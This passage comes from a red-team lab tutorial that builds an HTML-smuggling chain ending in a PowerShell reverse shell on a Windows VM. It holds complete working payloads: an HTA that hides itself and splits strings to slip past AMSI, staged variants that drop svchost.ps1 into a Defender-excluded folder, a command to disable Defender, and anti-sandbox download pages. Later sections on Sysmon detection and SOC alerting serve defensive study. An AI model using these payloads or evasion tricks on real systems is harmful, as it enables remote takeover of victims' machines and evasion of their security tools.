| `-n` | **No DNS** -- use raw IP addresses, do not resolve hostnames |
| `-p 4444` | **Port 4444** -- the port number to listen on |

You should see:

```
listening on [any] 4444 ...
```

**Leave this terminal open and running.** It is now waiting for the Windows VM to connect back. When the reverse shell payload runs on Windows, this is where your interactive prompt will appear.

> **Why port 4444?** It is the conventional port for testing reverse shells. In a real engagement, you would use port 80 or 443 to blend in with normal web traffic. For our lab, 4444 is fine.

### 5.9 Building the Reverse Shell HTA

Now the critical part. We need an HTA file that, when executed via `mshta.exe`, launches PowerShell with a reverse shell connecting back to our Kali listener.

**The challenge: AMSI (Anti-Malware Scan Interface)**

Windows Defender includes AMSI, which sits between PowerShell and the execution engine. Before PowerShell runs any command, AMSI scans the command text for known malicious patterns. If AMSI sees the string `System.Net.Sockets.TCPClient` as a literal, it flags it.

**The solution: String concatenation and variable indirection**

Instead of writing `System.Net.Sockets.TCPClient` as a single literal string, we break it into fragments and assemble it at runtime using VBScript string concatenation. When PowerShell receives the command, the class name is stored in a variable (`$tc`) and used via `New-Object $tc(...)`. AMSI's pattern matcher has a harder time flagging this because the suspicious string never appears as a literal in the source.

**Create the reverse shell HTA on Kali:**

```bash
cat > ~/labs/payloads/revshell.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
</head>
<body>
<script language="VBScript">

    ' ============================================================
    '  STAGE 1: Hide the HTA window
    '  The HTA opens as a visible window by default. We make it
    '  invisible immediately so the victim does not see it.
    ' ============================================================
    self.resizeTo 0, 0
    self.moveTo -2000, -2000

    ' ============================================================
    '  STAGE 2: Build the reverse shell command
    '  We construct the PowerShell command using VBScript string
    '  concatenation. This fragments known malicious patterns so
    '  they do not appear as literal strings in the source.
    ' ============================================================

    Set objShell = CreateObject("WScript.Shell")

    ' Attack parameters -- change these to match your lab IPs
    Dim attackerIP, attackerPort
    attackerIP = "192.168.85.129"      ' Kali VM IP (Host-Only)
    attackerPort = "4444"              ' Listener port

    ' Build the PowerShell script line by line
    Dim ps
    ps = "$h='" & attackerIP & "';$p=" & attackerPort & ";"

    ' KEY EVASION: Break "System.Net.Sockets.TCPClient" into fragments
    ' PowerShell will concatenate these at runtime into the full class name
    ps = ps & "$tc='Sys'+'tem.Ne'+'t.Soc'+'kets.TC'+'PCli'+'ent';"

    ' Create the TCP connection using the variable, not the literal class name
    ps = ps & "$c=New-Object $tc($h,$p);"

    ' Get the network stream for reading/writing
    ps = ps & "$s=$c.GetStream();"

    ' Create a byte buffer for reading data from the socket
    ps = ps & "[byte[]]$b=0..65535|%{0};"

    ' The main loop: read commands, execute them, send output back
    ps = ps & "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"

    ' Convert received bytes to a string (the command from the attacker)
    ps = ps & "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"

    ' Execute the command using Invoke-Expression and capture output
    ps = ps & "$r=(iex $d 2>&1|Out-String);"

    ' Add a prompt to the output so the attacker knows where they are
    ps = ps & "$r2=$r+'PS '+(pwd).Path+'> ';"

    ' Convert the output to bytes and send it back through the socket
    ps = ps & "$by=([text.encoding]::ASCII).GetBytes($r2);"
    ps = ps & "$s.Write($by,0,$by.Length);$s.Flush()};"

    ' Clean up when the loop exits
    ps = ps & "$c.Close()"

    ' ============================================================
    '  STAGE 3: Execute PowerShell with our command
    '  -nop     = No profile (faster, no startup noise)
    '  -w hidden = Hidden window (victim sees nothing)
    '  -ep bypass = Bypass execution policy restrictions
    '  -c "..."  = Execute the command string we built
    ' ============================================================
    Dim fullCmd
    fullCmd = "powershell.exe -nop -w hidden -ep bypass -c """ & ps & """"

    ' Launch PowerShell -- the 0 means "hidden window"
    objShell.Run fullCmd, 0, False

    ' ============================================================
    '  STAGE 4: Clean up
    '  Wait briefly for PowerShell to start, then close the HTA.
    '  The reverse shell continues running in the PowerShell process.
    ' ============================================================
    WScript.Sleep 1000
    self.close

</script>
</body>
</html>
HTAEOF
```

**Let us walk through every stage:**

**Stage 1 — Window hiding:**
The HTA normally opens as a visible window. `self.resizeTo 0, 0` shrinks it to zero pixels. `self.moveTo -2000, -2000` moves it far off-screen as a backup. The `WINDOWSTATE="minimize"` in the HTA:APPLICATION tag also starts it minimized. Triple redundancy -- the victim never sees the window.

**Stage 2 — Command construction (this is the evasion):**
- `attackerIP` and `attackerPort` store the Kali listener details as VBScript variables
- The critical evasion: `$tc='Sys'+'tem.Ne'+'t.Soc'+'kets.TC'+'PCli'+'ent'` -- this constructs the string `System.Net.Sockets.TCPClient` at runtime using PowerShell's `+` operator for string concatenation. AMSI's pattern matcher scans the command text, but the suspicious class name is fragmented across multiple string literals. Each fragment (`Sys`, `tem.Ne`, `t.Soc`, etc.) is benign on its own.
- `New-Object $tc($h,$p)` creates the TCP connection using the variable `$tc` instead of the literal class name. This is called **variable indirection**.
- The read/execute/write loop: reads bytes from the socket → converts to string → executes via `iex` (Invoke-Expression) → captures output → sends output back through the socket. This loop is what makes the shell interactive.

**Stage 3 — Execution:**
- `powershell.exe -nop -w hidden -ep bypass -c "..."` launches PowerShell with:
  - `-nop` = No profile (skips loading the user's PowerShell profile, faster startup)
  - `-w hidden` = Hidden window (the PowerShell window is never visible)
  - `-ep bypass` = Execution policy bypass (allows running scripts regardless of policy)
  - `-c "..."` = The command string we constructed in Stage 2

**Stage 4 — Cleanup:**
- Waits 1 second for PowerShell to start (so the process exists before the HTA closes)
- `self.close` closes the HTA window -- the reverse shell continues running in the background PowerShell process

### 5.10 Testing the Reverse Shell

Let us test it directly first (without smuggling) to verify the payload works.

**Terminal 1 on Kali (listener -- should already be running):**

```bash
nc -lvnp 4444
```

**Terminal 2 on Kali (serve the HTA):**

```bash
cd ~/labs/payloads
python3 -m http.server 8080
```

**On the Windows VM:**

1. Open Firefox and download: `http://192.168.85.129:8080/revshell.hta`
2. Navigate to your Downloads folder
3. Double-click `revshell.hta`
4. If SmartScreen appears, click "More info" → "Run anyway"

**What should happen on Windows:**
1. A brief window flash (the HTA opening and immediately hiding)
2. The HTA window disappears
3. Nothing else visible happens -- but PowerShell is running hidden in the background

**Switch to your Kali listener terminal. You should see:**

```
listening on [any] 4444 ...
connect to [192.168.85.129] from (UNKNOWN) [192.168.85.128] 49832
PS C:\Users\Vamsi\Downloads>
```

**You have a shell.** Type commands and watch them execute on the Windows VM:

```
PS C:\Users\Vamsi\Downloads> whoami
desktop-target\vamsi

PS C:\Users\Vamsi\Downloads> hostname
DESKTOP-TARGET

PS C:\Users\Vamsi\Downloads> ipconfig | findstr IPv4
   IPv4 Address. . . . . . . . . . . : 192.168.85.128
   IPv4 Address. . . . . . . . . . . : 192.168.233.137

PS C:\Users\Vamsi\Downloads> dir C:\Users
 Volume in drive C has no label.
 Directory of C:\Users
...
```

**You are now interacting with the Windows VM from your Kali terminal.** Every command you type in Kali gets executed on the Windows machine, and the output streams back to you over the TCP connection on port 4444.

To exit the shell, press `Ctrl+C` in the Kali terminal.

### 5.11 What If Defender Catches It?

The obfuscated reverse shell HTA is designed to bypass AMSI's static pattern matching. In most lab configurations with default Defender (no cloud-connected Microsoft Defender for Endpoint / XDR), this works. However, if your Defender version has updated behavioral signatures or if you have cloud protection enabled, it may still get caught.

If Defender blocks the payload, here are two fallback approaches:

**Option A: Staged Execution via Exclusion Folder (recommended for learning)**

The `C:\Tools\Labs` folder was excluded from Defender scanning in Module 00. We can have the HTA write the PowerShell script to that folder and execute from there:

```bash
cat > ~/labs/payloads/revshell_staged.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
</head>
<body>
<script language="VBScript">
    self.resizeTo 0, 0
    self.moveTo -2000, -2000

    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Write the reverse shell script to the Defender-excluded folder
    Dim scriptPath
    scriptPath = "C:\Tools\Labs\svc.ps1"

    Set f = objFSO.CreateTextFile(scriptPath, True)
    f.WriteLine "$h='192.168.85.129';$p=4444"
    f.WriteLine "$c=New-Object System.Net.Sockets.TCPClient($h,$p)"
    f.WriteLine "$s=$c.GetStream()"
    f.WriteLine "[byte[]]$b=0..65535|%{0}"
    f.WriteLine "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
    f.WriteLine "  $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)"
    f.WriteLine "  $r=(iex $d 2>&1|Out-String)"
    f.WriteLine "  $r2=$r+'PS '+(pwd).Path+'> '"
    f.WriteLine "  $by=([text.encoding]::ASCII).GetBytes($r2)"
    f.WriteLine "  $s.Write($by,0,$by.Length);$s.Flush()}"
    f.WriteLine "$c.Close()"
    f.Close

    ' Execute from the excluded folder -- Defender will not scan this
    objShell.Run "powershell.exe -nop -w hidden -ep bypass -f " & scriptPath, 0, False

    WScript.Sleep 1000
    self.close
</script>
</body>
</html>
HTAEOF
```

This writes the reverse shell script to `C:\Tools\Labs\svc.ps1` (excluded from Defender), then executes it. Defender does not scan files in the excluded folder.

**Option B: Temporarily Disable Real-Time Protection (fastest for testing)**

In an **Administrator PowerShell** on the Windows VM:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Run the HTA. After confirming the shell works, re-enable protection:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $false
```

> **Real-world context:** In actual red team engagements, attackers do not have exclusion folders or the ability to disable Defender. They use advanced techniques: custom shellcode loaders written in C/Rust/Nim, AMSI memory patching, direct syscall invocation, or reflective DLL injection. These are beyond beginner scope but are covered conceptually in Module 04. The goal of THIS module is to master the delivery and execution chain. Once you understand HTML smuggling → HTA → PowerShell → shell, you can swap in any payload.

### 5.12 Deep Dive: How AMSI Works and Why Obfuscation Helps

Understanding AMSI is critical for anyone preparing for red team interviews. Here is how it works and why our obfuscation technique is effective:

**What AMSI is:**

AMSI (Anti-Malware Scan Interface) is a Windows API that allows security products (like Defender) to inspect script content before it executes. It is built into:
- PowerShell (scans every command and script)
- VBScript / JScript (scans scripts run by wscript/cscript/mshta)
- .NET in-memory assemblies
- Office VBA macros

**How AMSI scanning works:**

```
1. User runs a PowerShell command:
   powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444)"

2. Before executing, PowerShell calls AMSI:
   AmsiScanBuffer(command_text, length, ...)

3. AMSI passes the text to Defender's scanning engine

4. Defender checks the text against:
   - Known malicious strings ("System.Net.Sockets.TCPClient" + IP + port)
   - Pattern-based rules (socket creation followed by stream reading)
   - Behavioral heuristics

5. If flagged: execution is blocked, alert is raised
   If clean: execution proceeds normally
```

**Why our fragmentation works:**

When we write:
```powershell
$tc = 'Sys' + 'tem.Ne' + 't.Soc' + 'kets.TC' + 'PCli' + 'ent'
$c = New-Object $tc('192.168.85.129', 4444)
```

AMSI sees the raw command text. The string `System.Net.Sockets.TCPClient` never appears as a contiguous literal -- it only exists after PowerShell concatenates the fragments at runtime. AMSI's pattern matcher is looking for the literal string, and the fragments individually do not trigger any rule.

**Important caveat:** AMSI is getting smarter. Microsoft continuously improves AMSI's ability to detect obfuscation patterns. In some versions, AMSI performs limited deobfuscation (resolving simple concatenations). This is an arms race -- what works today may not work in 6 months. That is why professional red teams:
1. Test their payloads against the target's specific Defender version before deployment
2. Use multiple layers of obfuscation (not just string splitting)
3. Develop custom tools that use techniques AMSI cannot easily analyze (like encrypted shellcode loaded via C# reflection)

**For our lab:** The string concatenation technique works reliably against default Defender configurations on Windows 11. If your specific build has enhanced detection, use the staged approach from Section 5.11 (Option A) to focus on learning the delivery chain.

---

## Part 6: Anti-Analysis Techniques

Real-world HTML smuggling pages include checks to avoid automated analysis by security sandboxes. Here are the most common techniques and how to implement them.

### 6.1 User Interaction Gate

Instead of auto-downloading, require the user to click a button. Sandboxes rarely simulate button clicks.

We already implemented this in Part 4 (the "Download Document" button in the XOR-encrypted page). The key code is:

```javascript
// Don't auto-download. Wait for a human click.
document.getElementById('dlBtn').onclick = function() {
    // ... build and download the file only when clicked
};
```

**Why it works:** Automated sandboxes open the HTML page and wait for something to happen. If nothing downloads automatically, the sandbox sees a clean page and moves on.

### 6.2 Mouse Movement Detection

Check if a real human is interacting with the page:

```javascript
var mouseDetected = false;

document.addEventListener('mousemove', function() {
    if (!mouseDetected) {
        mouseDetected = true;
        // Only show the download button after mouse movement
        document.getElementById('dlBtn').style.display = 'inline-block';
    }
});
```

**Why it works:** Sandboxes do not typically simulate mouse movement. The download button never appears, so the sandbox sees a benign page.

### 6.3 Screen Size Check

Sandboxes often run in small, fixed-size virtual screens:

```javascript
if (screen.width < 800 || screen.height < 600) {
    // Likely a sandbox -- do nothing
    document.body.innerHTML = '<h1>Page not available</h1>';
} else {
    // Real user -- proceed with smuggling
    deliverPayload();
}
```

### 6.4 Time-Based Delay

Force a longer delay before payload delivery. Sandboxes typically analyze pages for a limited time (30-60 seconds):

```javascript
// Wait 45 seconds before doing anything
setTimeout(function() {
    deliverPayload();
}, 45000);
```

**Trade-off:** Real users might leave the page before 45 seconds. Most real campaigns use 3-5 seconds, balancing evasion with user patience.

### 6.5 Combined Anti-Analysis Smuggling Page

Let us build a page that combines multiple techniques:

```bash
cat > ~/labs/html/smuggle-advanced.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Secure File Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .portal {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 450px;
        }
        .btn {
            background: #6c63ff;
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            display: none;
            margin-top: 20px;
            transition: background 0.3s;
        }
        .btn:hover { background: #5a52d5; }
        .check { color: #4ade80; margin-right: 8px; }
        #checks { text-align: left; margin: 20px 0; font-size: 14px; }
        #checks div { margin: 8px 0; opacity: 0; transition: opacity 0.5s; }
    </style>
</head>
<body>
    <div class="portal">
        <h2>Secure File Portal</h2>
        <p>Verifying your session...</p>
        <div id="checks">
            <div id="c1">Verifying display resolution...</div>
            <div id="c2">Checking session integrity...</div>
            <div id="c3">Preparing secure download...</div>
        </div>
        <button class="btn" id="dlBtn">Access Document</button>
    </div>

    <script>
        var passed = 0;

        // Check 1: Screen size (anti-sandbox)
        setTimeout(function() {
            var el = document.getElementById('c1');
            el.style.opacity = 1;
            if (screen.width >= 800 && screen.height >= 600) {
                el.innerHTML = '<span class="check">&#10004;</span>Display verified';
                passed++;
            } else {
                el.innerHTML = '<span style="color:red;">&#10008;</span>Session invalid';
                return;
            }
        }, 1000);

        // Check 2: Delay (anti-sandbox timeout)
        setTimeout(function() {
            var el = document.getElementById('c2');
            el.style.opacity = 1;
            el.innerHTML = '<span class="check">&#10004;</span>Session verified';
            passed++;
        }, 3000);

        // Check 3: Wait for mouse movement (anti-automation)
        var mouseOk = false;
        document.addEventListener('mousemove', function handler() {
            if (!mouseOk) {
                mouseOk = true;
                var el = document.getElementById('c3');
                el.style.opacity = 1;
                el.innerHTML = '<span class="check">&#10004;</span>User verified';
                passed++;

                // If all checks pass, show the button
                if (passed >= 2) {
                    document.getElementById('dlBtn').style.display = 'inline-block';
                }
                document.removeEventListener('mousemove', handler);
            }
        });

        // Download function
        document.getElementById('dlBtn').onclick = function() {
            // Our payload: a simple text file (replace with real payload in practice)
            var payload = btoa("Anti-analysis checks passed!\nMouse detected. Screen size OK. Timing OK.\nIn a real scenario, this would be your payload.");

            var raw = atob(payload);
            var arr = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);

            var blob = new Blob([arr], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'SecureDocument.txt';
            a.click();
            URL.revokeObjectURL(url);

            this.innerText = 'Downloaded ✓';
            this.disabled = true;
        };
    </script>
</body>
</html>
HTMLEOF
```

Test it: Serve from Kali and open on Windows. Notice how the checks appear one by one, and the download button only shows after you move your mouse. A sandbox would never get past this.

---

## Part 7: Full Attack Chain -- Zero to Shell

This is the culmination of everything in this module. We chain every technique into a single, end-to-end attack that starts with an HTML page on your Kali web server and ends with you typing commands on the Windows VM from your Kali terminal.

### 7.1 The Scenario

```
ATTACKER (Kali - 192.168.85.129):
  Step 1: Create a reverse shell HTA payload
  Step 2: XOR-encrypt the HTA to hide it from static analysis
  Step 3: Build a smuggling page with anti-analysis checks
  Step 4: Start a netcat listener on port 4444
  Step 5: Host the smuggling page on a web server

VICTIM (Windows - 192.168.85.128):
  Step 6: Opens the attacker's URL in Firefox (simulating a phishing click)
  Step 7: Page passes anti-analysis checks and offers a download button
  Step 8: Victim clicks the button -- HTA file materializes in Downloads
  Step 9: Victim double-clicks the HTA -- mshta.exe runs the VBScript
  Step 10: VBScript launches hidden PowerShell with the reverse shell
  Step 11: PowerShell connects back to Kali on port 4444

RESULT:
  Step 12: Attacker has a live interactive shell on the Windows machine
```

### 7.2 Step 1: Create the Reverse Shell HTA (Kali)

We use the staged approach (writes to the Defender-excluded folder) for maximum reliability in the lab:

```bash
cat > ~/labs/payloads/shell_final.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" CAPTION="no" />
</head>
<body>
<script language="VBScript">
    self.resizeTo 0, 0
    self.moveTo -2000, -2000

    Set objShell = CreateObject("WScript.Shell")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' Write the reverse shell script to the excluded folder
    Dim sp
    sp = "C:\Tools\Labs\svchost.ps1"

    Set f = objFSO.CreateTextFile(sp, True)
    f.WriteLine "$h='192.168.85.129';$p=4444"
    f.WriteLine "$c=New-Object System.Net.Sockets.TCPClient($h,$p)"
    f.WriteLine "$s=$c.GetStream()"
    f.WriteLine "[byte[]]$b=0..65535|%{0}"
    f.WriteLine "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
    f.WriteLine "  $d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)"
    f.WriteLine "  $r=(iex $d 2>&1|Out-String)"
    f.WriteLine "  $r2=$r+'PS '+(pwd).Path+'> '"
    f.WriteLine "  $by=([text.encoding]::ASCII).GetBytes($r2)"
    f.WriteLine "  $s.Write($by,0,$by.Length);$s.Flush()}"
    f.WriteLine "$c.Close()"
    f.Close

    ' Execute from the excluded folder
    objShell.Run "powershell.exe -nop -w hidden -ep bypass -f " & sp, 0, False

    WScript.Sleep 1000
    self.close
</script>
</body>
</html>
HTAEOF
```

### 7.3 Step 2: Encrypt and Build the Smuggling Page (Kali)

```bash
# XOR-encrypt the HTA
python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/shell_final.hta ~/labs/payloads/shell_xor_b64.txt "GodLevel2026"

# Build the encrypted smuggling page
cd ~/labs
./scripts/build_xor_smuggler.sh payloads/shell_xor_b64.txt html/final_chain.html WindowsUpdate.hta "GodLevel2026"
```

### 7.4 Step 3: Start the Listener (Kali -- Terminal 1)

Open a **new terminal tab**:

```bash
nc -lvnp 4444
```

You should see:

```
listening on [any] 4444 ...
```

**Leave this running.** Do not close this terminal.

### 7.5 Step 4: Serve the Smuggling Page (Kali -- Terminal 2)

Open another terminal tab:

```bash
cd ~/labs/html
python3 -m http.server 8080
```

### 7.6 Step 5: The Attack Begins (Windows)

Now switch to the **Windows VM**. This is where you put yourself in the victim's shoes.

1. Open **Firefox** on the Windows VM
2. Navigate to: `http://192.168.85.129:8080/final_chain.html`
3. You see the dark-themed "Decrypting Document..." page with a spinning loader
4. After 3 seconds, the **"Download Document"** button appears
5. **Click the button** -- `WindowsUpdate.hta` drops into your Downloads folder
6. Open the **Downloads folder** in File Explorer
7. **Double-click** `WindowsUpdate.hta`
8. If SmartScreen warns: click **"More info"** → **"Run anyway"**
9. You see a brief window flash -- the HTA opens and immediately hides itself
10. Nothing else visible happens on the Windows side

### 7.7 Step 6: The Shell Lands (Kali)

**Switch to your Kali listener terminal (Terminal 1).** You should see:

```
listening on [any] 4444 ...
connect to [192.168.85.129] from (UNKNOWN) [192.168.85.128] 49847
PS C:\Tools\Labs>
```

**You are in.** You now have an interactive PowerShell prompt on the Windows VM.

### 7.8 Step 7: Interact with the Target

Run real reconnaissance commands on the compromised Windows machine from your Kali terminal:

```powershell
# Who are you?
PS C:\Tools\Labs> whoami
desktop-target\vamsi

# What machine is this?
PS C:\Tools\Labs> hostname
DESKTOP-TARGET

# What are the network interfaces?
PS C:\Tools\Labs> ipconfig

# Is Defender running? (yes -- you bypassed it, not disabled it)
PS C:\Tools\Labs> Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AMSIEnabled

# What users exist on this machine?
PS C:\Tools\Labs> net user

# What processes are running?
PS C:\Tools\Labs> Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize

# What is the OS version?
PS C:\Tools\Labs> [System.Environment]::OSVersion

# Look at the user's Documents folder
PS C:\Tools\Labs> dir $env:USERPROFILE\Documents

# Check installed software
PS C:\Tools\Labs> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize

# Check the Defender exclusion that allowed our payload
PS C:\Tools\Labs> Get-MpPreference | Select-Object -ExpandProperty ExclusionPath

# Read a file from the target
PS C:\Tools\Labs> Get-Content C:\Tools\Labs\whoami_output.txt
```

**This is real initial access.** You are executing commands on the Windows VM interactively, through a connection that the target machine initiated. From the network's perspective, Windows made an outbound TCP connection to port 4444 -- which looks like normal outbound traffic.

### 7.9 Step 8: Cleanup

When you are done, press `Ctrl+C` in the Kali listener terminal to close the shell.

On the **Windows VM**, clean up the dropped script:

```powershell
Remove-Item C:\Tools\Labs\svchost.ps1 -ErrorAction SilentlyContinue
```

### 7.10 Step 9: Trace the Complete Attack in Sysmon

Now put on your defender hat. Open an **Administrator PowerShell** on the Windows VM and trace every step of the attack:

**1. Find the HTML smuggling indicator (blob: in Zone.Identifier):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 15 -and $_.Message -match "blob:" } |
    Select-Object -First 3 |
    Format-List TimeCreated, Message
```

This shows `EID 15 (FileCreateStreamHash)` with `blob:` in the HostUrl -- the forensic fingerprint of HTML smuggling.

**2. Find the HTA execution (mshta.exe starting):**

```powershell
$startTime = (Get-Date).AddMinutes(-15)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {
        $_.TimeCreated -gt $startTime -and
        $_.Id -eq 1 -and
        $_.Message -match "mshta"
    } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You will see: `mshta.exe` launched by `explorer.exe`, with the HTA file path as the argument.

**3. Find the PowerShell reverse shell (spawned by mshta):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {
        $_.TimeCreated -gt $startTime -and
        $_.Id -eq 1 -and
        $_.Message -match "powershell" -and
        $_.Message -match "mshta"
    } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You will see: `powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1` with parent process `mshta.exe`.

**4. Find the network connection (the reverse shell callback):**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {
        $_.TimeCreated -gt $startTime -and
        $_.Id -eq 3 -and
        $_.Message -match "192.168.85.129"
    } |
    Select-Object -First 3 |
    Format-List TimeCreated, Message
```

You will see: `EID 3 (NetworkConnect)` -- `powershell.exe` connecting to `192.168.85.129:4444` via TCP.

**5. Find all commands executed through the shell:**

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object {
        $_.TimeCreated -gt $startTime -and
        $_.Id -eq 1 -and
        ($_.Message -match "whoami|hostname|ipconfig|net user|systeminfo")
    } |
    Sort-Object TimeCreated |
    Format-List TimeCreated, Message
```

**The complete attack chain as Sysmon sees it:**

```
[EID 15]  firefox.exe created: Downloads\WindowsUpdate.hta
          Zone.Identifier HostUrl: blob:http://192.168.85.129:8080/...
          ^^^^^ HTML SMUGGLING INDICATOR

[EID  1]  mshta.exe launched (Parent: explorer.exe)
          CommandLine: mshta.exe "C:\Users\...\Downloads\WindowsUpdate.hta"
          ^^^^^ HTA EXECUTION

[EID 11]  mshta.exe created file: C:\Tools\Labs\svchost.ps1
          ^^^^^ PAYLOAD STAGING

[EID  1]  powershell.exe launched (Parent: mshta.exe)
          CommandLine: powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1
          ^^^^^ REVERSE SHELL LAUNCH

[EID  3]  powershell.exe connected to 192.168.85.129:4444 (TCP outbound)
          ^^^^^ C2 CALLBACK

[EID  1]  whoami.exe launched (Parent: powershell.exe)
[EID  1]  hostname.exe launched (Parent: powershell.exe)
[EID  1]  ipconfig.exe launched (Parent: powershell.exe)
          ^^^^^ RECONNAISSANCE COMMANDS
```

**Every. Single. Step. Is. Logged.** This is why Module 01 (Defense Landscape) exists -- understanding what the defender sees is what separates a professional red team operator from a script kiddie who gets caught.

---

## Part 8: Detection Deep Dive -- What Defenders See

### 8.1 Sysmon Detection Matrix for the Full Attack Chain

| What Happened | Sysmon Event ID | What Gets Logged |
|:-------------|:---------------|:-----------------|
| Browser assembles file via Blob API | **EID 15** (FileCreateStreamHash) | Zone.Identifier with `blob:` HostUrl |
| HTA file written to Downloads | **EID 11** (FileCreate) | File path, creating process (firefox/edge) |
| User double-clicks the HTA | **EID 1** (ProcessCreate) | `mshta.exe` with HTA path, parent = `explorer.exe` |
| HTA writes PowerShell script | **EID 11** (FileCreate) | `C:\Tools\Labs\svchost.ps1` created by mshta |
| PowerShell reverse shell starts | **EID 1** (ProcessCreate) | `powershell.exe -nop -w hidden`, parent = `mshta.exe` |
| Reverse shell connects to Kali | **EID 3** (NetworkConnect) | Destination: `192.168.85.129:4444`, TCP outbound |
| Attacker runs whoami | **EID 1** (ProcessCreate) | `whoami.exe`, parent = `powershell.exe` |
| Attacker runs ipconfig | **EID 1** (ProcessCreate) | `ipconfig.exe`, parent = `powershell.exe` |

### 8.2 The Key Detection Indicators

**Indicator 1: `blob:` in Zone.Identifier (EID 15)**

When Sysmon logs a FileCreateStreamHash event with `blob:` in the HostUrl, it means the file was created via HTML smuggling. This is the most reliable indicator.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 15 -and $_.Message -match "blob:" } |
    Format-List TimeCreated, Message
```

**Indicator 2: mshta.exe spawning PowerShell (EID 1)**

`mshta.exe` running is not inherently suspicious. But `mshta.exe` spawning `powershell.exe` with `-w hidden` is a massive red flag.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "ParentImage.*mshta" } |
    Format-List TimeCreated, Message
```

**Indicator 3: Hidden PowerShell making outbound connections (EID 3)**

A hidden PowerShell process connecting to an external IP on a non-standard port is extremely suspicious.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 200 |
    Where-Object { $_.Id -eq 3 -and $_.Message -match "powershell" } |
    Format-List TimeCreated, Message
```

**Indicator 4: Rapid file creation then execution from Downloads (EID 11 + EID 1)**

A file appearing in the Downloads folder and being executed within seconds is suspicious, especially if it is an `.hta`, `.bat`, `.cmd`, `.vbs`, or `.js` file.

### 8.3 What a Professional SOC Alert Would Look Like

```
ALERT: HTML Smuggling → HTA → Reverse Shell Detected
Severity: CRITICAL

Timeline:
  15:30:42  firefox.exe created file: C:\Users\...\Downloads\WindowsUpdate.hta
            Zone.Identifier: blob:http://192.168.85.129:8080/...
  15:30:55  mshta.exe launched from explorer.exe
            Args: "C:\Users\...\Downloads\WindowsUpdate.hta"
  15:30:56  mshta.exe created file: C:\Tools\Labs\svchost.ps1
  15:30:56  powershell.exe launched from mshta.exe
            Args: powershell.exe -nop -w hidden -ep bypass -f C:\Tools\Labs\svchost.ps1
  15:30:57  powershell.exe connected to 192.168.85.129:4444 (TCP outbound)
  15:31:02  whoami.exe launched from powershell.exe
  15:31:05  hostname.exe launched from powershell.exe
  15:31:08  ipconfig.exe launched from powershell.exe

Kill Chain:
  Delivery:    HTML Smuggling (T1027.006)
  Execution:   Mshta (T1218.005) → PowerShell (T1059.001)
  C2:          Non-standard port TCP (T1571)
  Discovery:   whoami (T1033), hostname (T1082), ipconfig (T1016)

Indicators:
  ✗ blob: URL in Zone.Identifier (HTML smuggling fingerprint)
  ✗ mshta.exe → powershell.exe parent-child chain
  ✗ PowerShell with -w hidden and outbound network connection
  ✗ Multiple reconnaissance commands in rapid succession

Recommendation: ISOLATE ENDPOINT IMMEDIATELY
```

### 8.4 How Defenders Would Stop This

| Defense Layer | How It Would Block This Chain | Effectiveness |
|:-------------|:-----------------------------|:-------------|
| **Email Gateway** | Cannot block -- no malicious file in the email, just a link | ❌ Bypassed |
| **Web Proxy** | Could block if it executes JS and detects Blob creation. Most proxies cannot. | ❌ Bypassed |
| **MOTW + SmartScreen** | SmartScreen warns when HTA is opened. User must click "Run anyway". | ⚠️ Requires user click-through |
| **AMSI** | Scans PowerShell commands. Our obfuscation may bypass, or the staged approach avoids AMSI entirely. | ⚠️ Partially bypassed |
